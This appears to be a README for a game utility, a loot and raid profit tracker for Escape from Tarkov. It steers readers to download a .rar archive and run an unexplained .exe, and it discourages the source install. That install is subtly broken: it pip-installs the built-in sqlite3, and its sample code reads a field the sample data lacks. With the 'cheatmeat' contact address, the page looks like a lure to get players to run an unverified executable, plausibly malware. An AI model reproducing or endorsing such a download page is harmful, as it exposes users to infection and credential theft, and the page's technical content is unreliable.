# 🚀 Escape from Tarkov - Loot & Raid Profit Tracker

## 📌 Description
**Tarkov Loot & Raid Profit Tracker** is a desktop application that helps players track **loot, earnings, and raid profitability** in Escape from Tarkov.  
The software provides **live price tracking, route analysis, and PvP activity heatmaps**, helping players optimize their loot runs.

🔹 Supported maps: **Customs, Interchange, Shoreline, Reserve, Lighthouse, Streets of Tarkov**  
🔹 Data sources: **Cloud-based price updates, flea market API, user reports**  
🔹 Analytics: **Loot value, risk vs reward, PvP hotspots, best farming routes**  

---

## 🎯 Features
✅ **Live flea market price updates** (real-time loot valuation)  
✅ **Raid profitability analysis** (track earnings, losses, insurance returns)  
✅ **Graphical visualization of loot value over time**  
✅ **PvP activity heatmaps** (track where fights happen most often)  
✅ **Filters by risk, map, loot type (weapons, keys, valuables, barter items)**  

---

## 📥 Installation & Launch

### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
1️⃣ **Download and extract the `.rar` file**  
2️⃣ **Run `Tarkov_Loot_Raid_Profit_Tracker.exe`**  
🚀 **The application will set up everything automatically, just enjoy!**  

⚠️ **Important:** This method is **faster** and requires **no manual setup**!  

---

### 🔹 ❌ COMPLEX METHOD (For Developers Only)
❗ **This method is NOT recommended as it requires installing multiple dependencies manually.**  
❗ **Only use this if you know what you're doing!**  

#### 1️⃣ **Manually install dependencies**
```bash
pip install numpy matplotlib pandas PyQt5 requests sqlite3
```

#### 2️⃣ **Launch with manual settings**
```bash
export PYTHONPATH=$(pwd)/src
python src/main.py --use-cloud-data --debug-mode --force-render
```

❌ **This method is harder, prone to errors, and requires manual configuration.**  
💡 **Just use the .exe, it handles everything automatically!**  

---

## 🖥 User Interface
🔹 **Main window** with a Tarkov **loot & profit dashboard**  
🔹 **Filters and sorting by map, loot value, raid success rate**  
🔹 **Graphs for tracking market trends and raid profitability**  

Example code for tracking loot values:
```python
import pandas as pd

# Load loot price data
data = pd.read_json("data/tarkov_loot_prices.json")

# Filter valuable loot items worth over 50k rubles
valuable_loot = data[data["price"] > 50000]

# Display top loot items
print(valuable_loot[["name", "price", "rarity"]])
```

---

## 🖼 Examples
📌 **Loot value tracking & flea market price trends:**  
![Loot Prices](1.png)  

📌 **Raid profit and loss analysis:**  
![Profit Analysis](2.jpg)  

---

## 🔗 Data Sources
The application supports **cloud-based data updates** for real-time loot pricing and market trends.  
Example JSON file with loot price data:
```json
[
    {"name": "LEDX Skin Transilluminator", "category": "Medical", "price": 2250000},
    {"name": "Graphics Card", "category": "Electronics", "price": 750000}
]
```

---

## 🤝 Support & Contact
📌 **Join the community for updates and assistance!**  
📧 **Email:** cheatmeat@games.com  
